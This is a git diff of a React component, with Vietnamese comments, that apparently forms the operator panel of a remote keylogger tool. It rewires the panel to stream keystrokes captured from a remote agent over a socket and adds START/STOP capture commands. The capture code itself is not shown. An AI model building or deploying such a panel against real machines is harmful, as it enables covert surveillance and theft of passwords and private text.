@@ -1,139 +1,126 @@
-﻿import React, { useState, useEffect } from 'react'; // Sửa đổi import
-import { Keyboard, Play, Square, RefreshCw } from 'lucide-react'; // Thêm RefreshCw
+﻿// file: client/src/components/KeyloggerCard.tsx
 
-// 1. Import hook và service
+import { useState, useEffect, useRef } from 'react';
+import { Keyboard, Play, Square, Trash2, Download } from 'lucide-react';
 import { useSocket } from '../contexts/SocketContext';
 import { sendCommand } from '../services/socketService';
 
-// 2. Xóa bỏ interface KeylogEntry
-
 export default function KeyloggerCard() {
     const [isLogging, setIsLogging] = useState(false);
-    const [logs, setLogs] = useState<string>(""); // 3. Đổi logs thành string
-    const [isLoading, setIsLoading] = useState(false); // Thêm state loading
-    const { selectedAgentId } = useSocket(); // 4. Lấy agentId từ context
+    const [logs, setLogs] = useState<string>("");
+    const { socket, isConnected } = useSocket();
+    const logContainerRef = useRef<HTMLDivElement>(null);
 
-    // 5. XÓA BỎ: logsContainerRef, intervalRef, mockKeys, keyIndex
-    
-    // 6. XÓA BỎ: useEffect cũ (phần simulation)
-
-    // 7. VIẾT LẠI: handleStartLogging
-    const handleStartLogging = async () => {
-        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
-        setIsLoading(true);
-        try {
-            // Gửi lệnh "HOOK"
-            await sendCommand(selectedAgentId, 'keylog_start_hook');
-            setIsLogging(true);
-            setLogs("Đã bắt đầu theo dõi. Bấm 'Làm mới Logs' để xem kết quả.\n");
-        } catch (err: any) {
-            alert(`Lỗi khi bắt đầu: ${err.message}`);
-        }
-        setIsLoading(false);
-    };
-
-    // 8. VIẾT LẠI: handleStopLogging
-    const handleStopLogging = async () => {
-        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
-        setIsLoading(true);
-        try {
-            // Gửi lệnh "UNHOOK"
-            await sendCommand(selectedAgentId, 'keylog_stop_unhook');
-            setIsLogging(false);
-            setLogs("Đã dừng theo dõi.");
-        } catch (err: any) {
-            alert(`Lỗi khi dừng: ${err.message}`);
-        }
-        setIsLoading(false);
-    };
-
-    // 9. THÊM MỚI: handlePrintLogs (Lấy kết quả)
-    const handlePrintLogs = async () => {
-        if (!selectedAgentId) return alert('Vui lòng chọn một Agent trước.');
-        setIsLoading(true);
-        try {
-            // Gửi lệnh "PRINT"
-            const response = await sendCommand(selectedAgentId, 'keylog_print_logs');
-            // Agent sẽ trả về payload là một chuỗi (toàn bộ log đã ghi)
-            setLogs(response.payload || "(Không có dữ liệu log)");
-        } catch (err: any) {
-            setLogs(""); // Xóa log cũ nếu có lỗi
-            alert(`Lỗi khi lấy logs: ${err.message}`);
-        }
-        setIsLoading(false);
-    };
-
-    // 10. THÊM MỚI: Tự động xóa log khi đổi Agent
+    // --- SỬA LẠI LOGIC LẮNG NGHE ---
     useEffect(() => {
-        setLogs("");
-        setIsLogging(false);
-    }, [selectedAgentId]);
+        if (!socket) return;
 
+        // 1. Lắng nghe PHÍM GÕ (Kênh riêng: ReceiveKey)
+        socket.on("ReceiveKey", (key: string) => {
+            // Chỉ cộng dồn ký tự, không thêm giờ giấc để nhìn tự nhiên
+            setLogs(prev => prev + key);
+        });
+
+        // 2. (Tùy chọn) Lắng nghe trạng thái Bật/Tắt để hiện thông báo
+        socket.on("ReceiveLog", (msg: string) => {
+            if (msg.includes("STARTED")) {
+                setLogs(prev => prev + "\n\n--- [SESSION STARTED] ---\n");
+            }
+            if (msg.includes("STOPPED")) {
+                setLogs(prev => prev + "\n--- [SESSION STOPPED] ---\n");
+            }
+        });
+
+        return () => {
+            socket.off("ReceiveKey");
+            socket.off("ReceiveLog");
+        };
+    }, [socket]);
+
+    // Auto scroll
+    useEffect(() => {
+        if (logContainerRef.current) {
+            logContainerRef.current.scrollTop = logContainerRef.current.scrollHeight;
+        }
+    }, [logs]);
+
+    const handleStartLogging = async () => {
+        setIsLogging(true);
+        setLogs(""); // Xóa trắng màn hình khi bắt đầu mới
+        try {
+            await sendCommand('start_keylog');
+        } catch (err) {
+            alert("Lỗi: " + err);
+            setIsLogging(false);
+        }
+    };
+
+    const handleStopLogging = async () => {
+        setIsLogging(false);
+        try {
+            await sendCommand('stop_keylog');
+        } catch (err) {
+            alert("Lỗi: " + err);
+        }
+    };
+
+    const clearLogs = () => setLogs("");
 
     return (
-        <div className="bg-white rounded-lg shadow-md p-6">
-            <h3 className="text-lg font-bold text-gray-800 mb-4 flex items-center gap-2">
-                <Keyboard className="w-5 h-5" />
-                Keylogger {/* 11. Xóa chữ (Simulation) */}
-            </h3>
+        <div className="glass-panel p-6 rounded-lg h-full flex flex-col">
+            <div className="flex items-center justify-between mb-4">
+                <h2 className="text-xl font-bold text-green-500 neon-glow-green tracking-wider flex items-center gap-2">
+                    <Keyboard className="w-5 h-5" /> {'> KEYLOGGER_'}
+                </h2>
+                <div className="flex items-center gap-2">
+                    <div className={`w-2 h-2 rounded-full ${isLogging ? 'bg-green-500 animate-pulse shadow-[0_0_10px_#10b981]' : 'bg-red-500'}`} />
+                    <span className={`text-xs ${isLogging ? 'text-green-500' : 'text-red-500'}`}>
+                        {isLogging ? 'CAPTURING' : 'IDLE'}
+                    </span>
+                </div>
+            </div>
 
-            <div className="flex gap-2 mb-4">
-                {/* (Nút Start) */}
+            {/* Màn hình Terminal */}
+            <div
+                ref={logContainerRef}
+                className="terminal-window p-4 rounded-lg mb-4 flex-1 overflow-y-auto font-mono text-sm bg-black border border-green-500/30 shadow-inner min-h-[250px]"
+            >
+                <div className="text-green-500/60 mb-2 italic">
+                    {'// Waiting for keystrokes...'}
+                </div>
+
+                {/* Nội dung phím gõ */}
+                <pre className="text-green-500 leading-relaxed whitespace-pre-wrap font-mono break-all">
+                    {logs}
+                </pre>
+
+                {isLogging && <span className="text-green-500 animate-pulse inline-block">█</span>}
+            </div>
+
+            {/* Buttons */}
+            <div className="flex gap-3 mt-auto">
                 <button
                     onClick={handleStartLogging}
-                    disabled={isLogging || isLoading || !selectedAgentId} // Cập nhật disable
-                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
+                    disabled={isLogging || !isConnected}
+                    className="flex-1 bg-black neon-border-green hover:bg-green-950/30 px-4 py-3 rounded transition-all disabled:opacity-50 flex justify-center gap-2"
                 >
-                    <Play className="w-4 h-4" />
-                    Start Logging
+                    <Play className="w-4 h-4 text-green-500" />
+                    <span className="text-green-500 font-bold text-sm">START</span>
                 </button>
-                {/* (Nút Stop) */}
+
                 <button
                     onClick={handleStopLogging}
-                    disabled={!isLogging || isLoading || !selectedAgentId} // Cập nhật disable
-                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
+                    disabled={!isLogging}
+                    className="flex-1 bg-black neon-border-red hover:bg-red-950/30 px-4 py-3 rounded transition-all disabled:opacity-50 flex justify-center gap-2"
                 >
-                    <Square className="w-4 h-4" />
-                    Stop Logging
+                    <Square className="w-4 h-4 text-red-500" />
+                    <span className="text-red-500 font-bold text-sm">STOP</span>
+                </button>
+
+                <button onClick={clearLogs} className="bg-black neon-border-red px-4 py-3 rounded transition-all">
+                    <Trash2 className="w-4 h-4 text-red-500" />
                 </button>
             </div>
-
-            {/* 12. THÊM NÚT LÀM MỚI */}
-            <div className="flex gap-2 mb-4">
-                 <button
-                    onClick={handlePrintLogs}
-                    disabled={isLoading || !selectedAgentId} // Không cần isLogging
-                    className="flex-1 flex items-center justify-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400 disabled:cursor-not-allowed"
-                >
-                    <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin' : ''}`} />
-                    Làm mới Logs (Print)
-                </button>
-            </div>
-
-            {/* Màn hình terminal */}
-            <div
-                // 13. Xóa 'ref'
-                className="bg-gray-900 rounded-lg p-4 h-[300px] overflow-y-auto font-mono text-sm"
-            >
-                {/* 14. THAY ĐỔI CÁCH HIỂN THỊ LOG */}
-                {logs.length === 0 ? (
-                    <p className="text-gray-500">
-                        {!selectedAgentId ? "Vui lòng chọn một Agent." : "Bấm 'Start Logging' để bắt đầu..."}
-                    </p>
-                ) : (
-                    // Dùng <pre> để giữ lại các dấu xuống dòng (\n)
-                    <pre className="text-green-400 whitespace-pre-wrap">
-                        {logs}
-                    </pre>
-                )}
-            </div>
-
-            {isLogging && (
-                <div className="mt-2 text-sm text-green-600 flex items-center gap-2">
-                    <span className="w-2 h-2 bg-green-600 rounded-full animate-pulse"></span>
-                    Logging active on Agent {/* 15. Xóa (Simulation) */}
-                </div>
-            )}
         </div>
     );
 }
